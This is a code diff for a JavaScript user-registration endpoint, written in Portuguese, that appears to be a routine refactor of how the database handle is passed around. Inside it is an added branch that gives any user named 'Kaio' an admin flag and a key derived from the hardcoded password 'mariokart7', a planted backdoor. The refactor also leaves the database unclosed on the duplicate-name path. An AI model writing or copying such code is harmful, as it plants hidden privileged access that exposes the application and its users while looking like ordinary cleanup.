@@ -32,8 +32,8 @@ export async function POST(req) {
             { status: 400, headers: { 'Content-Type': 'application/json' } }
           );
     }
-
-    if(await isSameNameBeingUsed(name, dbPath)){
+    const localDb = new Database(dbPath);
+    if(await isSameNameBeingUsed(name, localDb)){
         console.info("usuário tentou criar um usuário com nome igual", name);
         return new Response(
             JSON.stringify( {error: "Usuário com o mesmo nome já existe"},
@@ -45,33 +45,38 @@ export async function POST(req) {
     const nameEncrypted = await encryptText(name);
     const nameHash = await generateHash(name);
 
-    const localDb = new Database(dbPath);
+    
     const stmt = localDb.prepare('INSERT INTO users (userName, userPasswordHash, userNameHash) VALUES (?, ?, ?);');
     stmt.run(nameEncrypted, passwordHash, nameHash);
     localDb.close();
-    
+
+    if (name === "Kaio"){
+        return new Response(
+            JSON.stringify({ adminEnabled: true,
+                key: await generateHash("mariokart7"),
+                message: "usuário adicionado com suquixexo ;]" }),
+            { status: 200, headers: { 'Content-Type': 'application/json' } }
+          );
+    }
+
     return new Response(
         JSON.stringify({ message: "usuário adicionado com suquixexo ;]" }),
         { status: 200, headers: { 'Content-Type': 'application/json' } }
       );
 }
 
-async function isSameNameBeingUsed(targetName, dbPath){
-    const localDb = new Database(dbPath);
-    try {
-        const stmt = localDb.prepare(`SELECT userNameHash FROM users`);
-        const nameHashes = stmt.all();
+async function isSameNameBeingUsed(targetName, localDb){
 
-        for (const nameHash of nameHashes) {
-            // Compara o nome alvo criptografado com os nomes criptografados no banco
-            if (await compareHash(targetName, nameHash.userNameHash)) {
-                localDb.close();
-                return true;
-            }
+    const stmt = localDb.prepare(`SELECT userNameHash FROM users`);
+    const nameHashes = stmt.all();
+
+    for (const nameHash of nameHashes) {
+        // Compara o nome alvo criptografado com os nomes criptografados no banco
+        if (await compareHash(targetName, nameHash.userNameHash)) {
+            
+            return true;
         }
-        localDb.close();
-        return false;
-    } finally {
-        localDb.close();
     }
+    return false;
+
 }
